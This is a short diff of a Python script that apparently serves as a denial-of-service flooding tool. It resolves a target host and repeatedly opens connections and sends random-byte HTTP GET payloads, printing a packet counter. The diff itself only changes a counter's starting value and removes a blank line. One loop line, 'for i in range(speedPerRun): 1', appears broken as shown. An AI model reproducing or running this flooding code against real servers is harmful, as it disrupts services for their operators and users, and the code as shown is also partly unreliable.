@@ -42,7 +42,7 @@ ip = socket.gethostbyname(host)
 
 bytesToSend = random._urandom(2450)
 
-i = 0;
+i = 1;
 
 
 
@@ -57,7 +57,6 @@ def goForDosThatThing():
                 dosSocket.connect((ip, port))
                 for i in range(speedPerRun): 1
                     try:
-                         
                         dosSocket.send(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"))
                         dosSocket.sendto(str.encode("GET ") + bytesToSend + str.encode(" HTTP/1.1 \r\n"), (ip, port))
                         print(Colors.BOLD + Colors.OKBLUE + "Sent packet . . . ." + Colors.WARNING + str(Count.packetCounter))
